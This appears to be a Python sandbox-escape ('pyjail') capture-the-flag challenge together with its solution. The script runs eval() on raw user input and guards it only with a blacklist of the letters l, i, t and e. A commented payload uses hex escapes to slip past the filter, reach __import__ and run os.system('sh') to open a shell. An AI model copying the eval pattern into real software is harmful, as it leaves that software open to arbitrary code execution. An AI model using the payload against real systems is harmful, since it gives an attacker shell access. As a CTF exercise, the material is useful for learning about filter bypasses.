expr = input("Input syntax to get shell / bash:\n; ")
blacklist = list("lite")

for char in expr:
    for c in blacklist:
        if char == c:
            print("u cant use ", char)
            exit()
    # if all(c in char for c in blacklist):
    #     print("u cant use ", char)
    #     exit()
eval(expr)

# payload
# vars(vars(vars()["__bu\x69\x6c\x74\x69ns__"])['__\x69mpor\x74__']('os'))['sys\x74em']('sh')